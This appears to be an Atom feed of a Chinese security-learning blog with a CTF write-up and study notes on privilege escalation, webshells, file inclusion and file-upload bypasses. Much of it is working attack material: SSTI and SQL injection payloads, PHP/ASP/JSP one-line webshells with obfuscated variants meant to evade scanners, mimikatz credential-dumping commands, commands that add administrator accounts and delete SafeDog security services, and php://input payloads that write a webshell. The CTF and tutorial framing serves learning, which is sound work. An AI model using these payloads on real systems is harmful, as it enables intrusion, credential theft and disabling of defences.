<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://z0ekball.github.io</id>
    <title>z0ekball</title>
    <updated>2022-04-14T13:29:05.222Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://z0ekball.github.io"/>
    <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://z0ekball.github.io/images/avatar.png</logo>
    <icon>https://z0ekball.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, z0ekball</rights>
    <entry>
        <title type="html"><![CDATA[秋季赛WP]]></title>
        <id>https://z0ekball.github.io/post/qiu-ji-sai-wp/</id>
        <link href="https://z0ekball.github.io/post/qiu-ji-sai-wp/">
        </link>
        <updated>2021-10-20T12:25:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="秋季赛wp">秋季赛WP</h1>
<p>一个人就是一支队伍</p>
<h2 id="web">WEB</h2>
<h3 id="easy-ssti">Easy-ssti</h3>
<p>服务器模板注入，jinja2漏洞，{{7*7}}有回显说明有注入漏洞，_和[被过滤，用require函数结合attr绕过。</p>
<p>Jinja2模板参考</p>
<p><a href="http://doc.yonyoucloud.com/doc/jinja2-docs-cn/templates.html%23builtin-filters">http://doc.yonyoucloud.com/doc/jinja2-docs-cn/templates.html#builtin-filters</a></p>
<p>注入语句：</p>
<pre><code class="language-php">{{lipsum|attr(request.args.a)|attr(&quot;get&quot;)(request.args.b)|attr(&quot;get&quot;)(&quot;e&quot;+&quot;val&quot;) (request.args.c)}}&amp;a=globals&amp;b=builtins&amp;c=import(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()

&quot;e&quot;+&quot;val&quot; ‘o’+’s’ “编码”.decode(‘base64’)绕过敏感字
</code></pre>
<h3 id="easy-sql1">Easy-sql1</h3>
<p>常规的1’/<strong>/or/</strong>/1&gt;0#和order by之后，经历一番绕过得出能运行的注入语句：</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/database(),2)#&amp;password=
</code></pre>
<p>得到数据库名</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414200716689.png" alt="image-20220414200716689" style="zoom: 150%;" />
<p>因为=被过滤，不想麻烦绕过就直接爆出整个表名</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/group_concat(table_name),2/**/from/**/information_schema.tables)#&amp;password=
</code></pre>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414200726337.png" alt="image-20220414200726337" style="zoom:80%;" />
<p>查找到含flag的表名:flag_table_1</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/FLAG,2/**/from/**/flag_table_1)#&amp;password=
</code></pre>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414200749595.png" alt="image-20220414200749595" style="zoom:80%;" />
<p>得flag</p>
<h3 id="easy-ez_upload">Easy-ez_upload</h3>
<p>用御剑扫描目录</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414200819812.png" alt="image-20220414200819812" style="zoom:80%;" />
<p>访问/robot.txt</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201035855.png" alt="image-20220414201035855" style="zoom:150%;" />
<p>得文件上传地址,只允许图片上传。用一句话木马攻击，尝试各种方法都没法上传成php格式后,尝试图马。一开始直接把一句话木马写在图片末尾，上传后发现被过滤掉了，考虑二次渲染。网上说png、jpeg不好改，用gif改。用winhex对比原gif和二次渲染过的gif找出相同的字段，插入木马。</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201044815.png" alt="image-20220414201044815" style="zoom:150%;" />
<p>上传图片，木马没有被过滤，但图片还是以gif格式解析，蚁剑无法连接…卡了好久之后看原来黑屏的网页</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201056641.png" alt="image-20220414201056641" style="zoom:100%;" />
<p>明明有提示文件包含我却没看…</p>
<p>利用文件包含漏洞，使gif以php格式解析，访问</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201118117.png" alt="image-20220414201118117" style="zoom:150%;" />
<p>蚁剑终于连接成功</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201126951.png" alt="image-20220414201126951" style="zoom:100%;" />
<p>找不到flag文件，用命令行试试</p>
<p><img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201206436.png" alt="image-20220414201206436" style="zoom:100%;" /><img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201222636.png" alt="image-20220414201222636" style="zoom:100%;" /></p>
<p>找到flag</p>
<h3 id="medium-web4">Medium-web4</h3>
<p>布尔盲注，感觉出题人应该是个好人，所以猜测是同一个库，尝试题目sql1的注入语句</p>
<pre><code>username=1'/**/union/**/(SeleCT/**/FLAG,2/**/from/**/flag_table_1)#&amp;password=
</code></pre>
<p>回显是good，说明猜对了</p>
<pre><code>username=1'or(length(database())&gt;6)#&amp;password=   good
username=1'or(length(database())&gt;7)#&amp;password=   try again
</code></pre>
<p>库名长度为7，猜应该是cumtctf，脚本爆破验证一下</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201316832.png" alt="image-20220414201316832" style="zoom:100%;" />
<p>没猜错，因为sql1的语句回显是good，猜测flag还是在flag_table_1</p>
<p>因为=被过滤，判断字符用&lt;和&gt;绕过</p>
<pre><code>username=1'or(select(ascii(mid((select(flag)from(flag_table_1)limit/**/0,1),1,1)))&gt;0)%26%26(select(ascii(mid((select(flag)from(flag_table_1)limit/**/0,1),1,1)))&lt;125)#&amp;password=
</code></pre>
<p>回显good，说明又猜对了，上脚本爆破得flag（脚本绕过语句存在注释符,所以和手注有区别，绕过空格不能用/**/,而用/<em>!</em>/），flag长度猜大一点</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201336573.png" alt="image-20220414201336573" style="zoom:100%;" />
<h2 id="re">RE</h2>
<h3 id="easy-签到">Easy-签到</h3>
<p>ida常规通过字符串找到函数</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201406640.png" alt="image-20220414201406640" style="zoom:100%;" />
<p>16进制解码得flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201446312.png" alt="image-20220414201446312" style="zoom:80%;" />
<h3 id="easy-net">Easy-net</h3>
<p>提示net，因为没有.net环境，无法看运行情况，但用ILSpy能直接反编译函数</p>
<p><img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201548593.png" alt="image-20220414201548593" style="zoom:80%;" /><img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201600870.png" alt="image-20220414201600870" style="zoom:100%;" /></p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201636689.png" alt="image-20220414201636689" style="zoom:80%;" />
<p>大致意思就是一个字符串经过一系列运算，能经过最后一个if判断。逆向爆破可以得到这个字符串，问题是不知道字符串长度。但经过算法OJ题的轮番折磨，我知道array2[j]里的j不能超过该数组长度28（array2有28个数），所以j最大值即字符串长度为28。</p>
<p>这就好办了，上脚本爆破得flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201654601.png" alt="image-20220414201654601" style="zoom:80%;" />
<h2 id="pwn">PWN</h2>
<h3 id="easy-pwn1">Easy-pwn1</h3>
<p>Nc一下，cat flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201725664.png" alt="image-20220414201725664" style="zoom:80%;" />
<h3 id="easy-pwn2">Easy-pwn2</h3>
<p>标准栈溢出，buf是0x40h但要读入0x60h的数据，参考攻防世界栈溢出的题解写脚本</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201801302.png" style="zoom:80%;" />
<p>Call system地址</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201819493.png" style="zoom:80%;" />
<p>填充0x48覆盖buf和push内容，再覆盖返回地址，脚本：</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201828914.png" style="zoom:80%;" />
<p>执行</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201839150.png" style="zoom:80%;" />
<h3 id="easy-pwn3">Easy-pwn3</h3>
<p>exeinfo查了一下, 32位</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201911585.png" style="zoom:80%;" />
<p>用ida32打开，通过字符串找到函数</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201924140.png" style="zoom:80%;" />
<p>查资料时发现博客</p>
<p><a href="https://blog.csdn.net/weixin_44145820/article/details/105482269">(10条消息) BUUCTF-PWN刷题记录-6_L.o.W的博客-CSDN博客</a></p>
<p>不能说毫无相关，简直就是一模一样…</p>
<p>先填充满缓冲区，泄露ebp，然后使用栈迁移执行system，运行得flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414201935583.png" style="zoom:80%;" />
<h2 id="crypto">Crypto</h2>
<h3 id="easy-签到-2">Easy-签到</h3>
<p>逆向爆破，懒得判断数字和符号，爆出来再加上就是flag</p>
<p>脚本</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414202014958.png" style="zoom:80%;" />
<p>加上数字和符号</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414202025543.png" style="zoom:80%;" />
<h3 id="easy-lcg">Easy-lcg</h3>
<p>LCG就是线性同余法，得到的是弱伪随机数，参考lcg教程</p>
<p>http://www.manongjc.com/detail/22-hpzrquvdaforjqj.html</p>
<p>参考里面的脚本，运行得到flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414202049990.png" style="zoom:80%;" />
<h2 id="misc">Misc</h2>
<h3 id="easy-签到-3">Easy-签到</h3>
<p>base32解密</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414202112612.png" style="zoom:80%;" /> 
<h3 id="easy-lsb">Easy-LSB?</h3>
<p>LSB隐写，Stegslove多次尝试修改低位的0、1，如图拿到flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414202129805.png" style="zoom:80%;" />
<h3 id="easy-压缩包">Easy-压缩包</h3>
<p>有点阴间的题目，第一个压缩包就是伪加密，HXD打开修改全局方式位标记为00 00，能够打开压缩包，得到下一个压缩包。HXD查看是真加密，根据提示用ziperello爆破得密码</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414202148412.png" style="zoom:80%;" />
<p>又得到了真两个加密文件，卡了好久之后想起加密的图在别的题里有原图，对比两这的冗余码，确认是同一个文件。一个已知解密文件和一个相同的加密文件不就是明文攻击嘛。</p>
<p>把已知图片压缩成包，ARCHPR明文攻击得密码，解开的flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414202156116.png" style="zoom:80%;" />
<h3 id="easy-加密">Easy-加密？</h3>
<p>套娃加密题，图片是福尔摩斯密码，解密得到密码SHERLOCK</p>
<p>第二个压缩包的txt文件是零宽字符加密，解密得密码</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414202220004.png" style="zoom:80%;" />
<p>打开flag文件, base16解密</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414202227205.png" style="zoom:80%;" />
<h3 id="medium-社工">Medium-社工？</h3>
<p>一开始用微信QQ扫码都没用，就着jpeg研究了好久还是解不出，直到我知道一个叫中国编码的东东…</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20220414202251180.png" style="zoom:80%;" />
<p>WANG/JIA就是这个人的名字，也就拿到了flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[提权学习]]></title>
        <id>https://z0ekball.github.io/post/ti-quan/</id>
        <link href="https://z0ekball.github.io/post/ti-quan/">
        </link>
        <updated>2021-08-14T06:14:33.000Z</updated>
        <content type="html"><![CDATA[<p><code>提权前提</code>：</p>
<p>1.拥有普通用户权限</p>
<p>2.拥有网站webshell</p>
<p>3.存在提权漏洞</p>
<h3 id="信息收集">信息收集</h3>
<h4 id="命令行">命令行</h4>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1649935140181.png" alt="" loading="lazy"></figure>
<p>查看远程控制是否开启：</p>
<pre><code class="language-php">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDebyTSConnections
</code></pre>
<p>查看portnumber开启的端口:</p>
<pre><code class="language-php">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber
</code></pre>
<p>检索敏感文件：</p>
<pre><code class="language-php">dir /b /s *.txt
</code></pre>
<p>收集可利用poc：多关注新漏洞和已知漏洞，收集脚本，方便利用</p>
<h4 id="漏洞分析工具">漏洞分析工具</h4>
<p><code>Windows_Exploit_Suggester</code>：通过下载微软公开漏洞库到本地“生成日期+mssb.xls”文件，然后根据操作系统版本，跟systeminfo生成的文件进行比对，从而发现系统是否存在未修复漏洞。</p>
<pre><code class="language-php">//下载漏洞库
windows-exploit-suggester.py –update
//靶机生成系统信息文件
systeminfo &gt; win10.txt
//查看系统漏洞
windows-exploit-suggester.py --database 2018-08-11-mssb.xls --systeminfo win10.txt
</code></pre>
<p><code>Linux_Exploit_Suggester</code>：根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
<pre><code class="language-php">//查看内核信息
uname -a-
//检测漏洞
./Linux_Exploit_Suggester.pl
//指定版本检测漏洞
./Linux_Exploit_Suggester.pl -k 2.6.28
</code></pre>
<h4 id="获取密码工具">获取密码工具</h4>
<p><code>minikatz</code>：抓取密码</p>
<pre><code class="language-php">//提取权限
privilege::debug   
//抓取密码
sekurlsa::logonpasswords   
</code></pre>
<p><code>WCE</code>：抓取密码</p>
<pre><code class="language-php">//查看当前登录的用户及加密的密码
wce-universal.exe -l
//查看当前用户登录的详细信息
wce-universal.exe -lv
//删除一个指定会话的luid
wce-universal.exe -d ID号
//刷新会话信息
wce-universal.exe -e(手动更新)
//拼接会话信息,拼接会话信息可以隐藏用户身份和信息
wce-universal.exe -i ID号 -s 用户信息
//生成指定字符串的lmhash和ntlmhash
wce-universal.exe -g 明文密码
//查看明文信息
wce-universal -w
</code></pre>
<h3 id="系统提权">系统提权</h3>
<h4 id="提权工具">提权工具</h4>
<p><code>at命令</code>：Windows XP中内置的命令</p>
<pre><code class="language-php">at+时间+/interaction cmd
</code></pre>
<p><code>sc命令</code>：XP系统中功能强大的DOS命令</p>
<pre><code class="language-php">//创建super进程
sc Creat Super binPath=&quot;cmd /K start&quot; type=own type=interact
//启动
sc start Super
</code></pre>
<p><code>pin.jector.exe</code>：注入进程</p>
<pre><code class="language-php">//查看可注入进程
pin.jector.exe -l
//注入pid为600进程，使用端口2345返回cmd
pin.jector.exe -p 600 cmd 2345
//监听注入的进程
nc -nv 192.268.1.57 2345
</code></pre>
<h4 id="windows提权">Windows提权</h4>
<p><code>提权准备</code>：</p>
<p>使用 Windows-Exploit-Suggester获取目前系统中可能存在的漏洞，步骤如下。</p>
<p>①	收集并编译相关POC。</p>
<p>②	若操作系统中安装了杀毒软件及安全防护软件，则需要对提权 POC	进行免杀，否则直接 进行下一步。</p>
<p>③	上传POC。</p>
<p>④	由WebShell或者反弹WebShell来执行命令。</p>
<p>⑤	搜索漏洞，根据关键字进行搜索</p>
<pre><code class="language-php">例如MS10-061。
    
●	在百度浏览器中搜索“MS10-061	site：exploit-db.com”。
●	访问packetstormsecurity网站进行搜索（https：//packetstormsecurity.com/search/？ q=MS16-016）。 
●	安全焦点的BugTraq是一个出色的漏洞和Exploit数据源，可以通过CVE编号或者产品信息漏洞直接搜索，网址为http：//www.securityfocus.com/bid。
</code></pre>
<p><code>MSF搜索可利用poc</code>：</p>
<p>（1）搜索POC 在Kali中打开MSF或者执行“/usr/bin/msfconsole”命令，在命令提示符下使用search ms+年份后两位</p>
<pre><code class="language-php">//搜索2018年Windows下所有可用exploit
search ms18
</code></pre>
<p>（2）查看相关漏洞情况</p>
<p>可以通过微软官方网站查看漏洞所对应的版本</p>
<p>利用方式 :“https：//technet.microsoft.com/library/security/漏洞号”</p>
<pre><code class="language-php">例如查看 MS08-068的网页，打开方式为“https：//technet.microsoft.com/library/security/ms08-068”。
如果显 示为“严重”，则表明可以被利用。
</code></pre>
<p><code>实施提权</code>：</p>
<p>可以通过执行命令进行提权</p>
<pre><code class="language-php">//直接执行木马
poc.exe ma.exe
//添加用户
poc.exe &quot;net user antian365 lqaz2wsx /add&quot;
poc.exe &quot;net user localgroup administrators antian365 /add&quot;
//获取明文密码或者哈希值
poc.exe &quot;wce32.exe&quot; -w
poc.exe &quot;wce64.exe&quot; -w
poc.exe &quot;wce32&quot;
</code></pre>
<p><code>停用安全狗</code>：</p>
<p>停用安全狗的相关服务：</p>
<pre><code class="language-php">net stop &quot;Safedog Guard Center&quot; /y
net stop &quot;Safedog Update Center&quot; /y
net stop &quot;SafeDogCloudHelper&quot; /y
</code></pre>
<p>删除SafeDogGuardCenter服务：</p>
<pre><code class="language-php">sc stop &quot;SafeDogGuardCenter&quot;
sC config &quot;SafeDogGuardCenter&quot; start= disabled
sC delete &quot;SafeDogGuardCenter&quot;

sC stop &quot;Sa feDogUpdateCenter&quot;
sC config &quot;SafeDogUpdateCenter&quot; start= disabled
sC delete &quot;SafeDogUpdateCenter&quot;

sc stop &quot;SafeDogCloudHelper”
sC config &quot;SafeDogCloudHelper&quot; start= disabled
sC delete &quot;Sa feDogCloudHelper&quot;
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[简单木马]]></title>
        <id>https://z0ekball.github.io/post/jian-dan-mu-ma/</id>
        <link href="https://z0ekball.github.io/post/jian-dan-mu-ma/">
        </link>
        <updated>2021-08-10T11:12:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="一句话木马">一句话木马</h2>
<h3 id="原理">原理</h3>
<pre><code class="language-php"> &lt;?php @eval($_POST['pass']); ?&gt;
</code></pre>
<p><code>&lt;?php ?&gt;</code>：解析成php代码</p>
<p><code>@</code>：不报错</p>
<p><code>$_POST['pass']</code>：php里面几个超全局变量，<code>$_GET</code>、<code>$_POST</code>就是其中之一，意思为用post方法接收pass这个变量</p>
<p><code>eval()</code>：eval()把字符串作为PHP代码执行</p>
<p><code>整句意思</code>：post方式接收变量pass，若pass=echo 'a'，则代码就成了<code>&lt;?php eval(&quot;echo 'a';&quot;); ?&gt;</code>，也就是通过pass这个变量传入php代码为所欲为。</p>
<p>通过一句话木马，使用菜刀、蚁剑、冰蝎等强悍的工具，可以攻陷整个网站主机。</p>
<h3 id="常见一句话木马">常见一句话木马</h3>
<h4 id="基础款">基础款</h4>
<pre><code class="language-php">php的一句话木马：&lt;?php @eval($_POST['pass']);?&gt;
asp的一句话木马：&lt;%eval request (&quot;pass&quot;)%&gt;
aspx的一句话木马：&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
jsp的一句话木马：
&lt;%
if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());
%&gt;
</code></pre>
<h4 id="简单变型">简单变型</h4>
<p>php:</p>
<pre><code class="language-php">//绕过&lt;?
&lt;script language=&quot;php&quot;&gt;@eval($_POST[pass])&lt;/script&gt;
    
//assert函数
&lt;?php assert(@$_POST[pass]);?&gt;
    
//creat_function函数，传参到fun()并执行
&lt;?php
$fun = create_function('',$_POST['pass']);
$fun();
?&gt;
    
//call_user_func回调函数，绕过waf
&lt;?php
@call_user_func(assert,$_POST['pass']);
?&gt;

//preg_replace函数
&lt;?php
@preg_replace(&quot;/abcde/e&quot;, $_POST['pass'], &quot;abcdefg&quot;);
?&gt;

// file_put_contents函数,生成木马文件
&lt;?php
$test='&lt;?php $a=$_POST[&quot;pass&quot;];assert($a); ?&gt;';
file_put_contents(&quot;Trojan.php&quot;, $test);
?&gt;

//array数组
&lt;?php
$a='assert';
array_map(&quot;$a&quot;,$_REQUEST);
?&gt;
&lt;?php
$item['JON']='assert';
$array[]=$item;
$array[0]['JON']($_POST[&quot;pass&quot;]);
?&gt;

//php变量函数
&lt;?php
$a = &quot;eval&quot;;
$a(@$_POST['pass']);
?&gt;

</code></pre>
<h3 id="木马免杀">木马免杀</h3>
<h4 id="木马查杀">木马查杀</h4>
<p><code>文件内容查杀</code>：对脚本文件中所使用的关键词、高危函数、文件修改的时间、文件权限、文件的所有者以及和其它文件的关联性等多个维度的特征进行检测,即先建立一个恶意字符串特征库，同时对WEB文件修改时间，文件权限以及文件所有者等进行确认。容易误报，无法对加密或者经过特殊处理的Webshell文件进行检测。</p>
<p><code>网络请求查杀</code>：当木马被执行时，如果请求参数的值中存在某些危险函数、或者关键字，那么会被防护产品拦截，通过Webshell运行时使用的系统命令或者网络流量及状态的异常来判断动作的威胁程度。</p>
<p><code>日志分析查杀</code>：使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测 技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>
<h4 id="木马免杀-2">木马免杀</h4>
<p><code>关键字绕过</code>：拆分关键字</p>
<p><code>构造函数</code>：构造一个函数，拼接成一句话木马</p>
<pre><code class="language-php">&lt;?php
function x()
{
    return $_POST['pass'];
}
eval(x());
?&gt;
</code></pre>
<p><code>注释隔断</code>：一般查杀会对高危函数的前后语句进行拼接并检测，注释符可以隔断这种拼接从而绕过检查</p>
<pre><code class="language-php">&lt;?php
function x()
{
    return &quot;/*sasas23123*/&quot;.$_POST['pass'].&quot;/*sdfw3123*/&quot;;
}
eval(x());
?&gt;
</code></pre>
<p><code>转码绕过</code>：转码特征值，再通过解码来执行相关语句</p>
<p><code>数组拼接</code>：利用数组拼接木马语句</p>
<pre><code class="language-php">&lt;?php
$b = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);
$a = array($arrayName = ($arrayName =($arrayName = array('a' =&gt; $b($_POST['pass'])))));
?&gt;
</code></pre>
<p><code>工具利用</code>：传统方法利用菜刀管理webshell 的流量特征很明显，很容易被检测到，可使用流量加密的webshell工具，如冰蝎，来躲避流量监测。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[文件包含]]></title>
        <id>https://z0ekball.github.io/post/wen-jian-bao-han/</id>
        <link href="https://z0ekball.github.io/post/wen-jian-bao-han/">
        </link>
        <updated>2021-07-29T02:59:27.000Z</updated>
        <content type="html"><![CDATA[<p><code>漏洞原理</code>：include()、include_once()、require()、require_once()等函数可以直接以php格式执行包含文件的代码，不受文件格式限制。web应用这些函数，且包含的文件路径是由用户传输参数方式引入，用户访问被包含文件时该文件以php格式解析。攻击者需要知道文件存放的路径才能进行访问。</p>
<pre><code class="language-php">include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行
require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行
include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含
</code></pre>
<p><code>敏感路径</code>：</p>
<p>典型：</p>
<pre><code class="language-php">?page=a.php
?home=b.html
?file=content…
</code></pre>
<p>Windows：</p>
<pre><code class="language-php">C:\boot.ini //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件
C:\windows\repair\sam //存储 windows 系统初次安装的密码
C:\Program Files\mysql\my.ini //mysql 配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\windows\php.ini //php 配置信息
C:\windows\my.ini //mysql 配置文件
</code></pre>
<p>UNIX/Linux：</p>
<pre><code class="language-php">/etc/passwd
/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/usr/local/app/php5/lib/php.ini //PHP 相关配置
/etc/httpd/conf/httpd.conf //apache
/etc/php5/apache2/php.ini //ubuntu 系统的默认路径
</code></pre>
<h4 id="本地包含">本地包含</h4>
<p>1.txt和1.php在同一文件目录下，被包含文件无论什么格式都能解析成php</p>
<p>1.txt:</p>
<pre><code class="language-php">&lt;?php phpinfo();?&gt;
</code></pre>
<p>1.php:</p>
<pre><code class="language-php">&lt;?php
$b=$_GET['id'];
include($b);
?&gt;
</code></pre>
<p><code>playload</code>:</p>
<pre><code class="language-php">***/1.php?id=1.txt //返回phpinfo页面
</code></pre>
<h4 id="远程包含">远程包含</h4>
<p><code>条件</code>： 一般 PHP 默认关闭远程包含，开启远程文件包含功能需要在 php.ini 中修改：<br>
Allow_url_include = on、allow_url_fopen=on</p>
<p><code>playload</code>:</p>
<pre><code class="language-php">***/1.php?id=http:(文件绝对路径) 
</code></pre>
<h4 id="php伪协议">php伪协议</h4>
<p><code>file://</code>:</p>
<p>用于访问本地文件系统</p>
<p>条件(php.ini)： allow_url_fopen   off/on    allow_url_include off/on</p>
<pre><code class="language-php">file：//[文件的绝对路径和文件名]
    file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
file：//[文件的相对路径和文件名]
    file=./phpinfo.txt
file：//[http：//网络路径和文件名]
    file=http://127.0.0.1/phpinfo.txt 
</code></pre>
<p><code>php：//filter</code>：</p>
<p>用于读取源码并进行bash64编码输出；<br>
条件（php.ini）：allow_url_fope   off/on  allow_url_include off/on</p>
<pre><code class="language-php">php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码
（针对php文件需要base64编码）
</code></pre>
<p><code>php：//input</code>：</p>
<p>可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；<br>
条件(php.ini)：allow_url_fope   off/on     allow_url_include on</p>
<pre><code class="language-php">php://input + [POST DATA]执行php代码
</code></pre>
<p>有写入权限则可以写入一句话木马</p>
<pre><code class="language-php">php://input
[POST DATA部分]
&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;
</code></pre>
<p><code>php://stdin</code>:</p>
<p>只读，php://stdout 和 php://stderr 是只写的。</p>
<p><code>php://output</code>:是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
<p><code>php://fd</code>:允许直接访问指定的文件描述符。</p>
<p><code>zip://,bzip://,zlib://</code>:</p>
<p>压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p>
<p>条件：    allow_url_fope   off/on    allow_url_include off/on</p>
<pre><code class="language-php">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
bzip2://file.bz2
zlib://file.gz
</code></pre>
<p><code>data://</code>：</p>
<p>传递相应格式数据，用于执行php代码</p>
<p>条件：    allow_url_fope   on    allow_url_include on</p>
<pre><code class="language-php">data://text/plain,&lt;?php%20phpinfo();?&gt;
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
</code></pre>
<p><code>phar：//</code></p>
<p>与zip://类似，同样可以访问zip格式压缩包内容</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[文件上传]]></title>
        <id>https://z0ekball.github.io/post/wen-jian-shang-chuan/</id>
        <link href="https://z0ekball.github.io/post/wen-jian-shang-chuan/">
        </link>
        <updated>2021-07-27T08:23:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="文件上传漏洞">文件上传漏洞</h2>
<h3 id="1无验证">1.无验证</h3>
<p>也就是前端和后端都不过滤上传的文件，故只需传入含一句话木马</p>
<pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
</code></pre>
<p>的php文件，再用菜刀或者蚁剑连接即可。</p>
<h3 id="2js前端验证">2.js前端验证</h3>
<p>顾名思义，就是只在浏览器前端进行简单的文件名过滤，只允许上传某种文件名。简单粗暴的做法是直接禁用浏览器里的js代码。<br>
<code>绕过方法</code>：把含有一句话木马的php文件改成允许上传的文件名，上传并抓包，修改文件后缀为php再放包即可。</p>
<h3 id="3mime绕过">3.MIME绕过</h3>
<p>上传php木马，抓包修改Content-Type为合法类型即可</p>
<p>例如：image/gif</p>
<h3 id="4htaccess">4.htaccess</h3>
<p><code>htaccess文件</code>：是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。在文件上传中构造htaccess文件能使png以php格式解析。</p>
<p><code>和httpdp.com区别</code>：只作用于当前目录，只在访问当前目录才加载</p>
<p><code>漏洞利用</code></p>
<pre><code class="language-php">//方法一
SetHandler application/x-httpd-php  	//所有的文件当做php文件来解析
//方法二
AddType application/x-httpd-php .png	//.png文件当作php文件解析
</code></pre>
<p>在htaccess文件中写入代码并上传，再上传写有一句话木马的png文件，蚁剑连接即可。</p>
<h3 id="5文件头检查">5.文件头检查</h3>
<p>前面都是把含有一句话木马的php文件改变后缀变成png或者gif等可上传文件，而文件头检查则检查该文件的特征值，判断时候是真的png或者gif，故需要进一步伪装文件头。</p>
